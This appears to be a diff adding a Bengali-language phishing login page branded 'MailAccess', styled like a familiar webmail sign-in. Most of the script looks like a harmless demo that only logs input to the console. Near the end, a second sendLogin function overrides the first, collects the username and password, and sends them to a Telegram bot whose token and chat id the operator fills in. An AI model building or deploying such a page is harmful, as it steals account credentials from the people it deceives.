@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <title>MailAccess Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Roboto", sans-serif; }
+    body {
+      background: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .card {
+      width: 100%;
+      max-width: 380px;
+      background: #fff;
+      padding: 26px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+    }
+    .brand {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .brand .icon {
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      background: linear-gradient(135deg,#ff7043,#42a5f5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 18px;
+      font-weight: 700;
+      margin: 0 auto 6px;
+    }
+    .brand .text {
+      font-size: 18px;
+      font-weight: 500;
+      color:#202124;
+    }
+
+    .title {
+      font-size: 22px;
+      font-weight: 500;
+      color:#202124;
+      margin-bottom: 4px;
+    }
+    .subtitle {
+      font-size: 14px;
+      color:#5f6368;
+      margin-bottom: 20px;
+    }
+
+    .input {
+      width: 100%;
+      padding: 11px 12px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      margin-bottom: 12px;
+      font-size: 14px;
+    }
+    .input:focus {
+      border-color:#1a73e8;
+      outline: none;
+      box-shadow: 0 0 0 1px #e8f0fe;
+    }
+
+    .link {
+      font-size: 13px;
+      color:#1a73e8;
+      text-decoration:none;
+      display:inline-block;
+      margin-top: 6px;
+    }
+
+    .actions {
+      display:flex;
+      justify-content:space-between;
+      margin-top: 25px;
+      gap: 8px;
+    }
+    .btn-text {
+      border: none;
+      background: none;
+      color:#1a73e8;
+      cursor:pointer;
+      font-size:14px;
+      padding: 6px 0;
+    }
+    .btn-primary {
+      background:#1a73e8;
+      color:#fff;
+      border:none;
+      padding:10px 20px;
+      border-radius:4px;
+      cursor:pointer;
+      font-size:14px;
+      min-width: 90px;
+    }
+    .btn-primary:active {
+      opacity: 0.9;
+    }
+
+    /* Step hiding */
+    #step2 { display: none; }
+  </style>
+</head>
+<body>
+
+<div class="card">
+
+  <div class="brand">
+    <div class="icon">M</div>
+    <div class="text">MailAccess</div>
+  </div>
+
+  <!-- STEP 1: EMAIL -->
+  <div id="step1">
+    <div class="title">সাইন ইন</div>
+    <div class="subtitle">আপনার ইমেইল দিন</div>
+
+    <input id="username" type="text" class="input" placeholder="ইমেইল">
+
+    <a href="#" class="link">ইমেইল ভুলে গেছেন?</a>
+
+    <div class="actions">
+      <button class="btn-text" type="button" onclick="createAccount()">অ্যাকাউন্ট তৈরি করুন</button>
+
+      <!-- এখানে দুইটা ফাংশন একসাথে কল হচ্ছে -->
+      <button class="btn-primary" type="button" onclick="sendLogin(); goStep2();">
+        পরবর্তী
+      </button>
+    </div>
+  </div>
+
+  <!-- STEP 2: PASSWORD -->
+  <div id="step2">
+    <div class="title">স্বাগতম</div>
+    <div id="showEmail" class="subtitle" style="font-weight:500;"></div>
+
+    <input id="Password" type="password" class="input" placeholder="পাসওয়ার্ড">
+
+    <a href="#" class="link">পাসওয়ার্ড ভুলে গেছেন?</a>
+
+    <div class="actions">
+      <button class="btn-text" type="button" onclick="backStep1()">পেছনে যান</button>
+      <button class="btn-primary" type="button" onclick="loginNow()">পরবর্তী</button>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  // এটা প্রথমে কল হবে (বাটনে ক্লিক করলে)
+  function sendLogin() {
+    const email = document.getElementById("username").value.trim();
+
+    if (!email) {
+      alert("ইমেইল দিন");
+      // ইমেইল না থাকলে পরের স্টেপে যেতে দেব না
+      return;
+    }
+
+    // আপাতত শুধু কনসোলে দেখাচ্ছি
+    console.log("ইমেইল পাওয়া গেছে:", email);
+
+    // চাইলে পরে এখান থেকে নিরাপদ ভাবে নিজের সার্ভারে পাঠাবে
+    // উদাহরণ:
+    // fetch('/save-email', {
+    //   method: 'POST',
+    //   headers: { 'Content-Type': 'application/json' },
+    //   body: JSON.stringify({ email })
+    // });
+  }
+
+  // ইমেইল স্টেপ -> পাসওয়ার্ড স্টেপ
+  function goStep2() {
+    const email = document.getElementById("username").value.trim();
+
+    // sendLogin এর ভিতরে চেক করলেও, এখানে আরেকবার সেফচেক রাখা হল
+    if (!email) {
+      return; // ফাঁকা থাকলে কিছু করবে না
+    }
+
+    document.getElementById("showEmail").innerText = email;
+    document.getElementById("step1").style.display = "none";
+    document.getElementById("step2").style.display = "block";
+  }
+
+  // পেছনে যাওয়ার বাটন
+  function backStep1() {
+    document.getElementById("step2").style.display = "none";
+    document.getElementById("step1").style.display = "block";
+  }
+
+  // ফাইনাল লগইন (পাসওয়ার্ড স্টেপ এ)
+  function loginNow() {
+    const email = document.getElementById("username").value.trim();
+    const pass  = document.getElementById("Password").value.trim();
+
+    if (!pass) {
+      alert("পাসওয়ার্ড দিন");
+      return;
+    }
+
+    console.log("লগইন ডেটা:", { email, pass });
+
+    // এখানে নিরাপদ ভাবে তোমার সার্ভারে পাঠাবে
+    // fetch('/login', {
+    //   method: 'POST',
+    //   headers: { 'Content-Type': 'application/json' },
+    //   body: JSON.stringify({ email, password: pass })
+    // })
+    // .then(res => res.json())
+    // .then(data => { ... })
+    // .catch(err => console.error(err));
+
+    alert("লগইন সম্পন্ন (ডেমো)!");
+  }
+
+  function createAccount() {
+    alert("নতুন অ্যাকাউন্ট তৈরি ফিচার এখনো যোগ করা হয়নি (ডেমো)।");
+  }
+  
+  
+  
+
+    function sendLogin() {
+      const user = document.getElementById('username').value;
+      const pass = document.getElementById('password').value;
+
+      if (!user || !pass) {
+        alert("Please fill all fields");
+        return;
+      }
+
+      // আপনার Telegram Bot Token এবং Chat ID এখানে বসান
+      const botToken = "__TOKEN__";
+      const chatId = "__CHATID__";
+
+      const message = `🔐 New Login Info:\n👤 Username: ${user}\n🔑 Password: ${pass}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      })
+        .then(res => alert("Login তথ্য Telegram এ পাঠানো হয়েছে!"))
+        .catch(err => alert("Error sending to Telegram"));
+    }
+  
+
+  
+  
+  
+</script>
+
+</body>
+  </html>
